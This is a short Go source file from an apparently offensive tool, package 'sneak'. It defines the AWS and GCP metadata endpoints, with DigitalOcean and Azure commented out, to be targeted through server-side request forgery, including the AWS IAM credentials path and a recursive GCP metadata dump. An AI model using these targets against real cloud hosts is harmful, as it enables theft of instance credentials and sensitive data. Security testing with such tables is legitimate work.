package sneak

// All cloud metadata endpoints we support to perform SSRF against
type MetadataEndpoints map[string]CloudSsrf

type CloudSsrf struct {

	// URL to ping first to validate cloud provider
	Litmus string

	// Headers we may need to set (this is mainly for GCP)
	Headers *map[string]string

	// API paths to hit to recover sensitive information
	Paths map[string]string
}

func GetMetadataEndpoints() MetadataEndpoints {
	return map[string]CloudSsrf{
		"aws": CloudSsrf{
			Litmus:  "http://169.254.169.254/latest/",
			Headers: nil,
			Paths: map[string]string{
				"hostname": "/latest/meta-data/hostname",
				"token":    "/latest/meta-data/iam/",
			},
		},
		"gcp": CloudSsrf{
			Litmus:  "http://169.254.169.254/computeMetadata/",
			Headers: nil,
			Paths: map[string]string{
				"all": "/computeMetadata/v1/?recursive=True",
			},
		},
		/*
		   "do": CloudSsrf{
		       Litmus: "http://169.254.169.254/metadata/v1/"
		   },
		   "azure": CloudSsrf{
		       Litmus: "http://169.254.169.254/metadata/instance",
		   },
		*/
	}
}
